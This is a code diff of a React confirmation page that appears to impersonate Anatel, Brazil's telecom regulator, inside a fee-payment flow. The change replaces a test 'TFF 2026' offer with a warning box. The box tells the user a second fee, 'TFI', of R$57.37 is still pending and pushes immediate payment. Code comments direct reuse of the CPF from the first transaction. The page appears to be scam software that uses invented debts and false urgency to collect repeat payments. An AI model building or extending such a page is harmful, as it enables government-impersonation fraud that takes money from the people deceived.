@@ -13,19 +13,19 @@ const fmtCNPJ = (c) => {
 export default function AnatelConfirmacaoPage() {
   const navigate = useNavigate();
   const location = useLocation();
-  const valor = location.state?.valor || 68.86;
+  const valor = location.state?.valor || 68.85;
   const cnpj = location.state?.cnpj || '';
   const dadosEmpresa = location.state?.dadosEmpresa || { nome: 'Contribuinte', cnpj };
   const cpfUtilizado = location.state?.cpfUtilizado || null;
 
-  const [mostrar2026, setMostrar2026] = useState(true);
-  const valorTFF2026 = 5.00; // TESTE
+  const [mostrarTFI, setMostrarTFI] = useState(true);
+  const valorTFI = 57.37; // TFI - Taxa de Fiscalização de Instalação (sem acréscimos)
 
   const dataHoje = new Date().toLocaleDateString('pt-BR', {
     day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit'
   });
 
-  const pagar2026 = () => {
+  const pagarTFI = () => {
     // Garantir que dadosEmpresa tem o cnpj
     const empresaCompleta = {
       ...dadosEmpresa,
@@ -36,17 +36,17 @@ export default function AnatelConfirmacaoPage() {
       state: {
         dadosEmpresa: empresaCompleta,
         taxas: {
-          total: valorTFF2026,
+          total: valorTFI,
           taxas: [{
-            tipo: 'TFF – Taxa de Fiscalização de Funcionamento',
-            periodo: 'Exercício 2026',
-            principal: valorTFF2026,
+            tipo: 'TFI – Taxa de Fiscalização de Instalação',
+            periodo: 'Exercício 2025',
+            principal: valorTFI,
             acrescimos: 0,
-            total_item: valorTFF2026
+            total_item: valorTFI
           }]
         },
-        exercicio2026: true,
-        cpfAnterior: cpfUtilizado
+        exercicio2026: true,  // Usar isso para ir pra página final
+        cpfAnterior: cpfUtilizado  // Usar mesmo CPF da primeira transação
       }
     });
   };
@@ -135,36 +135,36 @@ export default function AnatelConfirmacaoPage() {
 
             {/* Sidebar */}
             <aside className="space-y-5">
-              {/* Oferta TFF 2026 */}
-              {mostrar2026 && (
+              {/* Oferta TFI - Segunda Taxa */}
+              {mostrarTFI && (
                 <div>
                   <div style={{ background: '#071D41' }} className="px-4 py-3 flex items-center gap-2">
                     <svg className="w-4 h-4" style={{ color: '#FFCD07' }} fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 7V3m8 4V3m-9 8h10M5 21h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v12a2 2 0 002 2z" />
+                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" />
                     </svg>
-                    <h3 className="text-white font-bold text-[13px] uppercase tracking-wider">TFF 2026</h3>
+                    <h3 className="text-white font-bold text-[13px] uppercase tracking-wider">TFI Pendente</h3>
                   </div>
                   <div style={{ border: '2px solid #071D41', borderTop: 'none' }} className="bg-white p-5">
                     <p className="text-[13px] text-gray-600 mb-4 leading-relaxed">
-                      Mantenha sua empresa regularizada com o pagamento do exercício 2026 sem multas ou acréscimos.
+                      Ainda existe uma <strong>Taxa de Fiscalização de Instalação (TFI)</strong> pendente para sua empresa. Regularize agora sem multas.
                     </p>
-                    <div style={{ background: '#f0f5ff', border: '1px solid #c7d9f5' }} className="p-4 text-center mb-4">
-                      <p className="text-[10px] text-gray-500 uppercase tracking-widest mb-1">Valor 2026</p>
-                      <p className="font-black text-[30px] text-[#071D41]">{fmt(valorTFF2026)}</p>
+                    <div style={{ background: '#fff3cd', border: '1px solid #ffc107' }} className="p-4 text-center mb-4">
+                      <p className="text-[10px] text-gray-600 uppercase tracking-widest mb-1">TFI 2025 - Sem acréscimos</p>
+                      <p className="font-black text-[30px] text-[#071D41]">{fmt(valorTFI)}</p>
                     </div>
                     <button
-                      data-testid="btn-pagar-2026"
-                      onClick={pagar2026}
+                      data-testid="btn-pagar-tfi"
+                      onClick={pagarTFI}
                       style={{ background: '#00A859' }}
                       className="w-full text-white font-black text-[14px] py-3.5 hover:opacity-90 transition-opacity cursor-pointer"
                     >
-                      Pagar TFF 2026 agora
+                      Pagar TFI agora
                     </button>
                   </div>
                 </div>
               )}
 
-              {!mostrar2026 && (
+              {!mostrarTFI && (
                 <button
                   onClick={() => navigate('/anatel')}
                   style={{ background: '#071D41' }}
